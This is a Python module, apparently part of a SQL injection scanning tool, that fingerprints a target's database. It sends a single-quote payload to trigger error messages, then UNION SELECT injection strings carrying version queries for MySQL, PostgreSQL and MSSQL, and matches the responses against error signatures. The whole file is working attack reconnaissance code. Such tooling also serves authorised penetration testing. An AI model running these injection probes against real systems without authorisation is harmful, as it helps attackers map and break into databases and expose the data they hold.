#!/usr/bin/env python3

import logging
import re
from typing import Dict, Optional, Tuple
from core.request_engine import RequestEngine

class DatabaseFingerprinter:
    def __init__(self, request_engine: RequestEngine):
        """Initialize the database fingerprinter with a request engine."""
        self.request_engine = request_engine
        self.db_signatures = {
            "mysql": {
                "error": [
                    "You have an error in your SQL syntax",
                    "check the manual that corresponds to your MySQL server version",
                    "MySQL server version",
                    "Warning: mysql_",
                    "valid MySQL result",
                    "check the manual that corresponds to your MariaDB server version",
                    "MySqlException"
                ],
                "version": [
                    "SELECT VERSION()",
                    "SELECT @@version",
                    "SELECT version()"
                ]
            },
            "postgresql": {
                "error": [
                    "PostgreSQL",
                    "pg_",
                    "PSQLException",
                    "ERROR: syntax error at or near",
                    "ERROR: invalid input syntax for",
                    "ERROR: column",
                    "ERROR: relation",
                    "ERROR: function"
                ],
                "version": [
                    "SELECT version()",
                    "SHOW server_version"
                ]
            },
            "mssql": {
                "error": [
                    "Microsoft SQL Server",
                    "SQLServer JDBC Driver",
                    "ODBC SQL Server Driver",
                    "SQLServerException",
                    "Warning: mssql_",
                    r"Msg \d+, Level \d+, State \d+",
                    r"Line \d+: Incorrect syntax near"
                ],
                "version": [
                    "SELECT @@version",
                    "SELECT SERVERPROPERTY('productversion')"
                ]
            }
        }
    
    def fingerprint(self) -> str:
        """Detect database type and version."""
        try:
            # Try error-based detection first
            db_type = self._detect_by_error()
            if db_type:
                return db_type
            
            # Try version-based detection
            db_type, version = self._detect_by_version()
            if db_type:
                return f"{db_type} {version}" if version else db_type
            
            return "unknown"
            
        except Exception as e:
            logging.error(f"Database fingerprinting failed: {str(e)}")
            return "unknown"
    
    def _detect_by_error(self) -> Optional[str]:
        """Detect database type by error messages."""
        try:
            # Send a request with a SQL syntax error
            payload = "'"
            response, _ = self.request_engine.send_request(payload)
            
            if not response:
                return None
            
            # Check response for database-specific error messages
            for db_type, signatures in self.db_signatures.items():
                for error_pattern in signatures["error"]:
                    if re.search(error_pattern, response.text, re.IGNORECASE):
                        logging.info(f"Detected {db_type} by error message")
                        return db_type
            
            return None
            
        except Exception as e:
            logging.error(f"Error-based detection failed: {str(e)}")
            return None
    
    def _detect_by_version(self) -> Tuple[Optional[str], Optional[str]]:
        """Detect database type and version by version queries."""
        try:
            for db_type, signatures in self.db_signatures.items():
                for version_query in signatures["version"]:
                    payload = f"' UNION SELECT {version_query}--"
                    response, _ = self.request_engine.send_request(payload)
                    
                    if not response:
                        continue
                    
                    # Look for version information in response
                    version_match = re.search(r'\d+\.\d+\.\d+', response.text)
                    if version_match:
                        logging.info(f"Detected {db_type} version {version_match.group()}")
                        return db_type, version_match.group()
            
            return None, None
            
        except Exception as e:
            logging.error(f"Version-based detection failed: {str(e)}")
            return None, None
    
    def get_database_info(self) -> Dict[str, str]:
        """Get detailed database information."""
        db_type = self.fingerprint()
        
        if db_type == "unknown":
            return {"type": "unknown", "version": "unknown"}
        
        # Split type and version if available
        if " " in db_type:
            type_, version = db_type.split(" ", 1)
            return {"type": type_, "version": version}
        
        return {"type": db_type, "version": "unknown"} 
